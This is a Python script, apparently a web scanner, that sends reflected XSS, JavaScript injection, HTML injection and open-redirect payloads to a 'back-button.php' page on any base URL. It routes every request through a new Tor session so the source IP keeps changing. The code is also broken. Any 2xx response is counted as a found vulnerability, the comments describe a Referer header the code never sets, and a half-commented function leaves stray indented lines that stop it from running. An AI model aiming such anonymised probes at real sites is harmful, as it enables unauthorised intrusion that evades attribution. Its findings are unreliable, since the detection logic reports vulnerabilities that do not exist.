import requests
from bs4 import BeautifulSoup
import sys
import os
import time
import json
from datetime import datetime
from pathlib import Path
import random

# JSON log directory
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)  # Script to create log folder when it does not exist

if len(sys.argv) > 2:
    base_url = sys.argv[1]  # Receives the base URL as the main code argument
    send_rate = sys.argv[2]  # Receives the send rate as the second argument
else:
    print("Base URL and/or send rate not provided.")
    sys.exit(1)

# Map the send rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(send_rate, 2)  # Uses 'medium' as default if the rate is not recognized


# Build the target URL using the base URL and the page name
target_url = f"{base_url}/index.php?page=back-button.php"
print(target_url)
print("")

def create_isolated_tor_session():
    """Create an isolated session with unique credentials for each call."""
    session = requests.Session()
    creds = f"{random.randint(10000, 0x7fffffff)}:password"
    session.proxies = {
        'http': f'socks5h://{creds}@localhost:9050',
        'https': f'socks5h://{creds}@localhost:9050'
    }
    return session

def check_ip(session):
    """Verifica e imprime o endereço IP atual usado pela sessão."""
    try:
        response = session.get('http://httpbin.org/ip', timeout=10)
        print(f"Current IP: {response.json()['origin']}")
    except requests.RequestException as e:
        print(f"Error checking IP: {e}")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}
# Payloads to test through the 'Referer' HTTP header
payloads = {
    'Reflected XSS': "<script>alert('XSS')</script>",
    'JS Injection': "javascript:alert('JS Injection');",
    'HTML Injection': "<h1>HTML Injection</h1>",
    'Unvalidated Redirect': "https://google.com/"
}
# Function to send the request and verify the response
def send_request_and_verify_response(complete_url, vulnerability_type, test_number):
    session = create_isolated_tor_session()  # Cria uma nova sessão para cada teste
    check_ip(session)
    test_response = session.get(complete_url, headers=headers)
    
    soup = BeautifulSoup(test_response.text, 'html.parser')
    title = soup.find('title').text if soup.find('title') else ''

    print(f"Test {test_number}: Testing '{vulnerability_type}'. Title: {title[:46]}")
    
    if test_response.status_code in (200, 201, 202, 204):
        print(f"Test #{test_number} PASSED: Possible vulnerability of '{vulnerability_type}' found!")
        print("")
        return 1, test_response
    else:
        print(f"Test #{test_number} FAILED: Status code: {test_response.status_code} or 'Access Denied' title found.")
        print("")
        return 0, test_response
    
# Function to debug the response
#def debug_response(response, test_number):
    print(f"\nResponse Details of Test #{test_number}:")
    print(f"Status Code: {response.status_code}")
    print("Response Headers:")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")
    print(f"Response Body: {response.text[:500]}...")  # Limited to the first 500 characters for brevity

# Counters for test results
total_tests = 0
tests_passed = 0
tests_failed = 0

detailed_tests = []

# Perform the tests
for vulnerability_type, payload in payloads.items():
    total_tests += 1
    payload_encoded = requests.utils.quote(payload)
    complete_url = f"{target_url}&xml={payload_encoded}&xml-validator-php-submit-button=Validate+XML"
    test_result, test_response = send_request_and_verify_response(complete_url, vulnerability_type, total_tests)
    if test_result == 1:
        tests_passed += 1
    else:
        tests_failed += 1
    
    
    test_detail = {
        'vulnerability_type': vulnerability_type,
        'payload': payload,
        'passed': test_result == 1,
        'status_code': test_response.status_code
    }
    detailed_tests.append(test_detail)
    time.sleep(delay)  # Adds a pause between requests based on the send rate

# Report the final results
print(f"\nTotal Tests: {total_tests}")
print(f"Tests Passed: {tests_passed}")
print(f"Tests Failed: {tests_failed}")
print(f"Tested URL: {target_url}")  # Debug and inform the final URL that was targeted

#-------------------------Data retrieval part--------------------------------------- 
# Record the results in a JSON file
results = {
    'date_time': datetime.now().strftime("%Y-%m-%d_%H-%M-%S"),
    'base_url': base_url,
    'total_tests': total_tests,
    'tests_passed': tests_passed,
    'tests_failed': tests_failed,
    'tested_url': target_url,
    'detailed_tests': detailed_tests  # Incluindo os detalhes dos testes
}

# Get the name of the current script
script_name = os.path.splitext(os.path.basename(__file__))[0]

file_name = f"results_{script_name}_{results['date_time']}.json"
full_file_path = logs_dir.joinpath(file_name)

with open(full_file_path, 'w') as file:
    json.dump(results, file, indent=4)

print(f"\nResults saved in {full_file_path}")
